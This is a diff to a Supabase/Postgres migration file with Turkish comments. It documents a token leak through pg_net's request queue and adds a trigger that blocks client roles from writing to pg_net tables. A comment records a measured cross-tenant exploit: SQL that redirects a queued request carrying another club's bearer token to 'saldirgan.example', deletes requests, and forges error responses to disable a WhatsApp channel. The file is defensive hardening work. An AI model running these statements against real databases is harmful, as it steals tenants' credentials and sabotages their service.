@@ -4347,13 +4347,37 @@ end $$;
 -- MİMARİNİN ÜÇ TAŞIYICI KARARI
 -- ===========================================================================
 --
--- 1) JETON HİÇBİR UYGULAMA KODUNA UĞRAMAZ.
---    Erişim jetonu Supabase Vault'ta şifreli durur; isteği Postgres'in kendisi
---    pg_net ile atar. Ne mobil uygulama, ne panel, ne de kulüp yöneticisi jetonu
---    görebilir. Alternatif (jetonu bir tabloda tutup Next.js'ten göndermek)
---    jetonu her dağıtım ortamına ve her log satırına yayardı.
---    ÖLÇÜLDÜ: `set local role authenticated; select * from vault.decrypted_secrets;`
---      → ERROR: permission denied for schema vault
+-- 1) JETON UYGULAMA KODUNA UĞRAMAZ — AMA VERİTABANI İÇİNDE AÇIKTA.
+--
+--    ⚠⚠ BU MADDE ÖNCE YANLIŞ YAZILDI. "Ne mobil uygulama, ne panel, ne de kulüp
+--    yöneticisi jetonu görebilir" deniyordu. Birinci yarısı doğru, ikinci yarısı
+--    YANLIŞ. Denetim turu buldu, bağımsız olarak doğrulandı:
+--
+--      set local role authenticated;          -- sıradan bir VELİ
+--      select count(*) from net.http_request_queue
+--       where headers::text like '%EAAG_...%';
+--        → 1 satırda jeton GÖRÜNÜYOR
+--
+--    Vault tarafı sağlam: `select * from vault.decrypted_secrets` authenticated
+--    için "permission denied for schema vault" veriyor. Ama jeton Vault'tan
+--    çıkıp Meta'ya giderken `net.http_post` onu Authorization başlığıyla
+--    `net.http_request_queue` tablosuna DÜZ METİN yazıyor ve o tablonun PUBLIC
+--    izni var. Kiracı ayrımı da yok: bir kulübün velisi TÜM kulüplerin jetonunu
+--    görebiliyor.
+--
+--    BUGÜN API'DEN ULAŞILAMIYOR: PostgREST yalnızca public ve graphql_public
+--    şemalarını yayınlıyor, `net` listede değil (Accept-Profile: net → 406).
+--    Yani duvar ŞEMADA DEĞİL, PostgREST AYARINDA — TEK KATMAN. "Exposed
+--    schemas" listesine bir gün `net` eklenirse anında kritik olur.
+--
+--    VERİTABANI İÇİNDEN KAPATILAMIYOR (ölçüldü): izinleri supabase_admin verdi,
+--    `postgres` superuser değil (rolsuper = f) ve supabase_admin üyesi değil;
+--    revoke, alter owner ve enable rls üçü de reddediliyor. 0048 YAZMA yolunu
+--    tetikleyiciyle kapattı, OKUMA açık kaldı.
+--
+--    KALICI ÇÖZÜM: gönderimi Edge Function'a taşımak — jeton hiç `net.*`'a
+--    uğramaz. Bu, aşağıdaki mimarinin değişmesi demek ve ayrı bir iş olarak
+--    planlanmalı. O zamana kadar risk yukarıdaki tek katmana bağlı.
 --
 -- 2) pg_net ASENKRON VE TRANSACTION'LIDIR.
 --    `net.http_post` bir `bigint` request_id döner; yanıt SONRA
@@ -5485,6 +5509,100 @@ begin
   end if;
   raise notice '0045 tamam: gönderim tavanı tetikleyicide, alıcı sınırı sarmalayıcıda, yanıt satırları temizleniyor.';
 end $$;
+
+
+-- ===========================================================================
+-- 13.9 pg_net YAZMA KILIDI — istemci rolleri kuyruga/yanita yazamaz  (0048)
+-- ===========================================================================
+-- net.http_request_queue ve net._http_response PUBLIC'e "arwdDxtm" ile acik.
+-- Bu izinler supabase_admin tarafindan verildigi ve postgres ne o rolun uyesi
+-- ne de superuser oldugu icin GERI ALINAMIYOR (olculdu: revoke -> WARNING,
+-- alter owner / enable rls / create rule -> "must be owner").
+--
+-- AMA "arwdDxtm" icinde t = TRIGGER de var: sahibi olmadigimiz tabloya
+-- TETIKLEYICI kurabiliyoruz. 0042 ve 0046 bu hakki hic denememis, "veritabani
+-- icinden yapilabilecek bir sey yok" sonucuna varmisti.
+--
+-- OLCULEN SOMURU (A kulubunun VELISI, rol=authenticated):
+--   update net.http_request_queue set url='https://saldirgan.example'  -> UPDATE 1
+--     (satirin headers alani 'Bearer <B kulubunun Meta jetonu>' tasiyor)
+--   delete from net.http_request_queue where id=<B'nin istegi>          -> DELETE 1
+--   insert into net._http_response values (<B'nin istek_id>, 401,
+--     '{"error":{"code":190}}', ...)                                    -> INSERT 0 1
+--   select private.wa_yanit_isle();  -> B kulubunun wa_hesap.aktif = false
+--   Yani bir veli, BASKA bir kulubun WhatsApp kanalini kapatabiliyor,
+--   jetonunu kendi sunucusuna yonlendirebiliyor ve sunucudan SSRF atabiliyor.
+--
+-- Bu somuru bugun PostgREST'ten ULASILAMIYOR (PGRST_DB_SCHEMAS=public,
+-- graphql_public; "Accept-Profile: net" -> 406 PGRST106). Duvarin o parcasi
+-- semada degil PostgREST ayarinda duruyor; bu blok onu semaya da koyuyor.
+--
+-- SECURITY INVOKER ZORUNLU: DEFINER olsaydi current_user fonksiyonun sahibi
+-- (postgres) donerdi ve kontrol hic devreye girmezdi.
+-- KARA LISTE BILINCLI: pg_net iscisinin hangi rolle yazdigi belgesiz; beyaz
+-- liste yapilsaydi isci disarida kalir ve TUM gonderim sessizce dururdu.
+-- OKUMA HALA ACIK: SELECT'i kapatmak RLS ister, RLS sahiplik ister.
+create or replace function public.net_istemci_yazamaz()
+returns trigger
+language plpgsql
+set search_path = ''
+as $fn$
+begin
+  if current_user in ('anon', 'authenticated') then
+    raise exception 'pg_net kuyruk/yanit tablolarina istemci rolleri yazamaz (0048).'
+      using errcode = 'insufficient_privilege';
+  end if;
+  if tg_op = 'DELETE' then
+    return old;
+  end if;
+  return new;
+end;
+$fn$;
+
+do $kilit$
+declare v_tablo text;
+begin
+  if not exists (select 1 from pg_namespace where nspname = 'net') then
+    raise notice '0048: pg_net kurulu degil, atlaniyor.';
+    return;
+  end if;
+  foreach v_tablo in array array['http_request_queue', '_http_response'] loop
+    if not exists (select 1 from pg_class c join pg_namespace n on n.oid = c.relnamespace
+                    where n.nspname = 'net' and c.relname = v_tablo and c.relkind = 'r') then
+      continue;
+    end if;
+    -- TEKRAR CALISTIRILABILIRLIK: "drop trigger if exists" YAZILAMAZ. Olculdu:
+    -- DROP TRIGGER tablo SAHIPLIGI ister ("must be owner of relation
+    -- http_request_queue"), CREATE TRIGGER ise PUBLIC'in t hakkiyla yetinir.
+    if exists (select 1 from pg_trigger
+                where tgname = 'zz_istemci_yazamaz'
+                  and tgrelid = ('net.' || quote_ident(v_tablo))::regclass) then
+      raise notice '0048: net.% kilidi zaten kurulu.', v_tablo;
+      continue;
+    end if;
+
+    begin
+      execute format('create trigger zz_istemci_yazamaz before insert or update or delete on net.%I '
+                     'for each row execute function public.net_istemci_yazamaz()', v_tablo);
+      raise notice '0048: net.% uzerine yazma kilidi kuruldu.', v_tablo;
+    exception when others then
+      -- Kurulum paketi BURADA DURMAMALI: bu bir sertlestirme, kurulumun on sarti degil.
+      raise warning '0048: net.% kilidi kurulamadi (%).', v_tablo, sqlerrm;
+    end;
+  end loop;
+end $kilit$;
+
+do $$
+declare v_sd boolean;
+begin
+  select prosecdef into v_sd from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+   where n.nspname = 'public' and p.proname = 'net_istemci_yazamaz';
+  if v_sd then
+    raise exception '0048: net_istemci_yazamaz SECURITY DEFINER olmus — koruma calismaz.';
+  end if;
+  raise notice '0048 tamam: pg_net yazma yuzeyi istemci rollerine kapatildi.';
+end $$;
+
 
 
 -- ===========================================================================
